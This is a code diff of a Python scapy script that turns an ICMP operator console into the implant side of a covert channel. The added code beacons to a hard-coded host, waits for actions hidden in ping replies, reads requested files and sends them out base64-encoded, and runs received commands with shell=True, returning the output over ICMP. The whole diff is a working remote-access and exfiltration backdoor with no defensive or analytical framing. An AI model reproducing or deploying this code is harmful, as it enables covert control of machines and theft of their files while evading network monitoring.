@@ -1,40 +1,83 @@
 from scapy.all import *
 import base64
+import time
 
 destination = "192.168.18.1"
 sniffInterface = "eth0"
+delayToKeepAlive = 5
+sendKeepAlive = True
 
 
-while True:
-
-    action = input("-----------------------\nWhat should we do (with a lazy sailor) ? \nActions are : file | message | command\n")
-	
-    if action == "file":
-		
-        fileName = input("Which file should we send ?\n")
-        fileToSend = open(fileName,"rb")
-        binaryData = fileToSend.read()
-        encoded = (base64.b64encode(binaryData)).decode('ascii')
+def keepAlive():
+    while(True):
+        if (sendKeepAlive):
+            print("[KeepAlive] Sending keep alive ... \n")
+            sendMessage(destination, "keepAlive")
+            time.sleep(delayToKeepAlive)
 
 
-        # Protocole : type d'envoi (file/message)
-        p = sr1(IP(dst=destination)/ICMP()/"file")
-        p = sr1(IP(dst=destination)/ICMP()/fileName)
-        p = sr1(IP(dst=destination)/ICMP()/encoded)
+# @return ICMP message's bytes
+def sniffMessage():
+    while(True):
+        a = sniff(iface=sniffInterface, filter="icmp", count=1)
+        # 0 is echo-reply and only listen for those
+        if a[0][2].fields.get("type") == 0:
+            return a[0][3].fields.get("load")
 
-    elif action == "command":
+# Send echo-request
+def sendMessage(destination, string):
+    p = sr1(IP(dst=destination)/ICMP(type=8, id=1, seq=1)/string, timeout=0)
+    # timeout is set to 0 to prevent waiting on the reply (that could never come)
 
-        command = input("What command should we run ?\n")
-        encodedCommand = base64.b64encode(command.encode('utf-8'))
 
-        # Protocole : type d'envoi (file/message)
-        p = sr1(IP(dst=destination)/ICMP()/"command")
-        p = sr1(IP(dst=destination)/ICMP()/encodedCommand)
+if __name__ == "__main__":
 
-        icmpReceived = sniff(iface=sniffInterface, filter="icmp", count=1)
-        base64Output = icmpReceived[0][3].fields.get("load").decode("utf-8")
-        print(base64.b64decode(base64Output))
-	
+    keepAliveThread = Thread(target = keepAlive)
+    keepAliveThread.start()
+    
+    while True:
 
-    elif action == "message":
-        print("Not implemented yet")
+        action = sniffMessage().decode("utf-8")
+        print("Received action : '"+action+"'")
+
+        if action == "file":
+            sendKeepAlive = False
+
+            fileName = sniffMessage().decode("utf-8")
+            fileToSend = open(fileName,"rb")
+            binaryData = fileToSend.read()
+            encoded = (base64.b64encode(binaryData)).decode('ascii')
+
+            print("fileToSend: "+fileName)
+            print("Encoded file: "+encoded)
+            sendMessage(destination, encoded)
+
+            sendKeepAlive = True
+
+        elif action == "command":
+
+            sendKeepAlive = False
+
+            base64Command = sniffMessage().decode("utf-8")
+            print("base64 command : "+base64Command)
+            decodedCommand = base64.b64decode(base64Command).decode("utf-8")
+            print("Decoded command : "+decodedCommand)
+
+            result = subprocess.run(
+                decodedCommand.split(),
+                shell = True,
+                capture_output = True, # Python >= 3.7 only
+                text = True # Python >= 3.7 only
+            )
+            output = "stdout:\n"+result.stdout+"\n\nstderr:\n"+result.stderr
+            print("command output: "+output)
+
+            encodedOutput = base64.b64encode(output.encode('utf-8'))
+            sendMessage(destination, encodedOutput)
+
+            print("Finished sending command output")
+            
+            sendKeepAlive = True
+
+        elif action == "message":
+            print(sniffMessage().decode("utf-8"))
